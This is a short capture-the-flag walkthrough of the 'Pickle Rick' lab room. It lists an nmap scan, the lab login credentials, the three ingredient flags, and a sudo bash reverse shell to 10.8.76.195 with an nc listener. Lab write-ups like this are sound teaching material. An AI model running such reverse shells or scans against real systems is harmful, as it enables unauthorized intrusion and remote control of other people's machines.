# Pickle Rick Walkthrough
  ![Pickle Rick](./images/rickandmorty.jpeg)


## Nmap Scan 

- **Command:**  
  ```bash
  sudo nmap -T4 -n -sC -sV -Pn -p- -oN fastscan.txt 10.10.44.71
  ```
- **Screenshot:**  
  ![Nmap Scan Screenshot](./images/nmap_scan_screenshot.png)

---

## Credentials

- **Username:** `R1ckRul3s`
- **Password:** `Wubbalubbadubdub`
- **robots.txt Entry:** `Wubbalubbadubdub`

---

## First Ingredient

- **Command Used:**  
  ```bash
  less Sup3rS3cretPickl3Ingred.txt
  ```
- **Flag:**  
  ```
  mr. meeseek hair
  ```
- **Screenshot:**  
  ![Screenshot](./images/first_ingredient.png)

---

## Second Ingredient

- **Command Used:**  
  ```bash
  less /home/rick/second\ ingredients
  ```
- **Flag:**  
  ```
  1 jerry tear
  ```
- **Screenshot:**  
  ![Screenshot](./images/second_ingredient.png)

---

## Third Ingredient

- **Reverse Shell Command:**  
  ```bash
  sudo bash -c 'bash -i >& /dev/tcp/10.8.76.195/1111 0>&1'
  ```
- **Listener Command:**  
  ```bash
  nc -lvnp 1111
  ```
- **Flag:**  
  ```
  fleeb juice
  ```
- **Screenshot:**  
  ![Screenshot](./images/third_ingredient.png)

  ## Tools Used to Complete the Room

  1. **Nmap**  
    For network scanning and service enumeration.

  2. **Gobuster**  
    To perform directory and file brute-forcing.

  3. **Linux Commands**  
    Common commands like `less`, `ls -al`, `cd`, etc., for file and directory navigation.

  4. **Reverse Shell Generator**  
    A browser extension used to craft reverse shell payloads.

  5. **Nikto**  
    A web server scanner used to identify vulnerabilities and misconfigurations.



## Happy Hacking

<div align="center">
  <img src="https://user-images.githubusercontent.com/74038190/225813708-98b745f2-7d22-48cf-9150-083f1b00d6c9.gif" alt="Live Demo">
</div>
